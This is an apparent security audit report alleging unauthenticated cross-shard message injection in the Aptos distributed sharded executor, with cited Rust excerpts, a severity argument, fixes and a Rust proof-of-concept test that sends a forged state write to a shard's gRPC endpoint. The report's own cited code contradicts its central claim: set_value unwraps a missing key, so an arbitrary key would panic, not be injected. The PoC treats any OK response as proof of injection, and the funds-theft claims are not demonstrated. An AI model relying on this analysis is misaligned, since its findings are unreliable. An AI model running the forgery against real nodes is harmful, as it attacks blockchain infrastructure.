# Audit Report

## Title
Unauthenticated Cross-Shard Message Injection in Distributed Sharded Block Executor

## Summary
The `RemoteCrossShardClient` implementation of the `CrossShardClient` trait sends cross-shard state synchronization messages over an unauthenticated gRPC channel, allowing an attacker with network access to forge `CrossShardMsg` messages and inject arbitrary state values during distributed parallel transaction execution. This breaks the deterministic execution invariant and can cause consensus safety violations.

## Finding Description

The sharded block executor uses cross-shard messages to propagate transaction write results between execution shards. While the `LocalCrossShardClient` implementation mentioned in the security question uses safe in-memory channels [1](#0-0) , the `RemoteCrossShardClient` implementation for distributed execution sends these messages over network without any authentication.

**Attack Flow:**

1. **Message Creation**: When a transaction commits, `CrossShardCommitSender` creates a `RemoteTxnWrite` message containing the state key and write operation [2](#0-1) 

2. **Network Transmission**: In remote execution mode, `RemoteCrossShardClient::send_cross_shard_msg` serializes the message with BCS and sends it through a network channel [3](#0-2) 

3. **Unauthenticated gRPC**: The message is sent via gRPC without TLS, signature verification, or any authentication mechanism [4](#0-3) 

4. **Blind Acceptance**: The receiving shard's `CrossShardCommitReceiver` blindly accepts any received message and injects it into the cross-shard state view [5](#0-4) 

5. **State Corruption**: The forged value is stored in `CrossShardStateView` and used by dependent transactions during execution [6](#0-5) 

**Exploitation**: An attacker with network access to executor shard endpoints can:
- Craft malicious `CrossShardMsg::RemoteTxnWriteMsg` with arbitrary `StateKey` and `WriteOp` values
- Send forged messages to the gRPC endpoint during block execution
- Cause dependent transactions to read incorrect state values
- Result in different shards producing different execution results and state roots

This violates the **Deterministic Execution** invariant: "All validators must produce identical state roots for identical blocks."

## Impact Explanation

This is **Critical Severity** under Aptos bug bounty criteria for the following reasons:

1. **Consensus/Safety Violations**: Different execution shards receiving different cross-shard state values will produce different transaction outputs and state roots for the same block. This breaks Byzantine Fault Tolerance assumptions and can cause chain splits.

2. **Loss of Funds**: By injecting forged state values for account balances, token supplies, or smart contract storage, an attacker can manipulate transaction execution to steal funds or mint tokens.

3. **State Consistency Breach**: The blockchain state becomes corrupted as different nodes have inconsistent views of the world state, violating the fundamental invariant of distributed consensus systems.

The vulnerability affects any deployment using the distributed sharded executor feature (`RemoteCrossShardClient`) [7](#0-6)  which is instantiated for multi-machine parallel execution setups.

## Likelihood Explanation

**Likelihood: Medium to High**

**Requirements for exploitation:**
- Network access to executor shard gRPC endpoints (typically internal infrastructure)
- Knowledge of message format (publicly available in codebase)
- Timing coordination with block execution windows
- Understanding of transaction partitioning to target specific state keys

**Mitigating factors:**
- Feature may only be used in specific high-performance validator setups
- Endpoints likely on private networks (though not enforced by code)
- Requires coordination with block execution timing

**Aggravating factors:**
- No cryptographic protection whatsoever
- Simple message format easy to forge
- Direct state injection without validation
- Clear exploitation path documented in code

The vulnerability is exploitable by any attacker who can reach the gRPC endpoint, which in production deployments might be restricted to internal networks, but this is an operational control not enforced by the code itself.

## Recommendation

Implement message authentication using one of these approaches:

**Option 1: Message-Level Signatures**
```rust
// In messages.rs
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct AuthenticatedCrossShardMsg {
    pub msg: CrossShardMsg,
    pub sender_shard: ShardId,
    pub signature: Signature,
}

// Each shard signs messages with its private key
// Receivers verify signatures using sender's public key
```

**Option 2: Mutual TLS Authentication**
Configure gRPC channels with TLS and client certificate verification to ensure only authorized shards can send messages [8](#0-7) 

**Option 3: HMAC-Based Authentication**
Use pre-shared keys between coordinator and shards to compute HMACs over message content.

**Immediate Mitigation:**
- Document that remote executor endpoints MUST be on isolated private networks
- Add configuration validation requiring TLS for remote execution mode
- Implement rate limiting and anomaly detection on cross-shard message reception

## Proof of Concept

```rust
// Proof of Concept: Forged Cross-Shard Message Attack
// This demonstrates how an attacker can inject arbitrary state values

use aptos_vm::sharded_block_executor::messages::{CrossShardMsg, RemoteTxnWrite};
use aptos_types::state_store::state_key::StateKey;
use aptos_types::write_set::WriteOp;
use aptos_protos::remote_executor::v1::{NetworkMessage, network_message_service_client::NetworkMessageServiceClient};
use std::net::SocketAddr;

#[tokio::test]
async fn test_forged_cross_shard_message() {
    // Setup: Attacker knows the target shard's gRPC endpoint
    let target_shard_addr = "127.0.0.1:8080"; // Executor shard endpoint
    
    // Step 1: Craft malicious state value
    let malicious_state_key = StateKey::raw(b"victim_account_balance");
    let malicious_value = vec![0xFF; 32]; // Inflated balance
    let forged_write_op = WriteOp::legacy_modification(malicious_value.into());
    
    // Step 2: Create forged CrossShardMsg
    let forged_msg = CrossShardMsg::RemoteTxnWriteMsg(
        RemoteTxnWrite::new(malicious_state_key, Some(forged_write_op))
    );
    
    // Step 3: Serialize message (same format as legitimate messages)
    let serialized = bcs::to_bytes(&forged_msg).unwrap();
    
    // Step 4: Send to target shard's gRPC endpoint
    let channel = tonic::transport::Endpoint::new(format!("http://{}", target_shard_addr))
        .unwrap()
        .connect()
        .await
        .unwrap();
    
    let mut client = NetworkMessageServiceClient::new(channel);
    
    let request = NetworkMessage {
        message: serialized,
        message_type: "cross_shard_0".to_string(), // Round 0 messages
    };
    
    // Step 5: Attack succeeds - no authentication check!
    let response = client.simple_msg_exchange(request).await;
    
    // The forged value is now injected into the target shard's CrossShardStateView
    // and will be used by dependent transactions, causing incorrect execution
    assert!(response.is_ok());
    println!("Attack successful: Forged state value injected!");
}
```

**Notes:**
- The `LocalCrossShardClient` implementation at line 328 in the security question is NOT vulnerable as it uses in-memory channels [9](#0-8) 
- The vulnerability exists in the network-based implementation that shares the same trait interface
- Both implementations lack authentication, but only the remote version crosses a security boundary

### Citations

**File:** aptos-move/aptos-vm/src/sharded_block_executor/local_executor_shard.rs (L312-323)
```rust
impl LocalCrossShardClient {
    pub fn new(
        global_message_tx: Sender<CrossShardMsg>,
        cross_shard_txs: Vec<Vec<Sender<CrossShardMsg>>>,
        cross_shard_rxs: Vec<Receiver<CrossShardMsg>>,
    ) -> Self {
        Self {
            global_message_tx,
            message_txs: cross_shard_txs,
            message_rxs: cross_shard_rxs,
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/local_executor_shard.rs (L327-329)
```rust
    fn send_global_msg(&self, msg: CrossShardMsg) {
        self.global_message_tx.send(msg).unwrap()
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L32-38)
```rust
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L118-130)
```rust
                    let message = RemoteTxnWriteMsg(RemoteTxnWrite::new(
                        state_key.clone(),
                        Some(write_op.clone()),
                    ));
                    if *round_id == GLOBAL_ROUND_ID {
                        self.cross_shard_client.send_global_msg(message);
                    } else {
                        self.cross_shard_client.send_cross_shard_msg(
                            *dependent_shard_id,
                            *round_id,
                            message,
                        );
                    }
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L55-59)
```rust
    fn send_cross_shard_msg(&self, shard_id: ShardId, round: RoundId, msg: CrossShardMsg) {
        let input_message = bcs::to_bytes(&msg).unwrap();
        let tx = self.message_txs[shard_id][round].lock().unwrap();
        tx.send(Message::new(input_message)).unwrap();
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L132-137)
```rust
    async fn get_channel(remote_addr: String) -> NetworkMessageServiceClient<Channel> {
        info!("Trying to connect to remote server at {:?}", remote_addr);
        let conn = tonic::transport::Endpoint::new(remote_addr)
            .unwrap()
            .connect_lazy();
        NetworkMessageServiceClient::new(conn).max_decoding_message_size(MAX_MESSAGE_SIZE)
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_state_view.rs (L49-56)
```rust
    pub fn set_value(&self, state_key: &StateKey, state_value: Option<StateValue>) {
        self.cross_shard_data
            .get(state_key)
            .unwrap()
            .set_value(state_value);
        // uncomment the following line to debug waiting count
        // trace!("waiting count for shard id {} is {}", self.shard_id, self.waiting_count());
    }
```

**File:** execution/executor-service/src/remote_executor_service.rs (L37-40)
```rust
        let cross_shard_client = Arc::new(RemoteCrossShardClient::new(
            &mut controller,
            remote_shard_addresses,
        ));
```
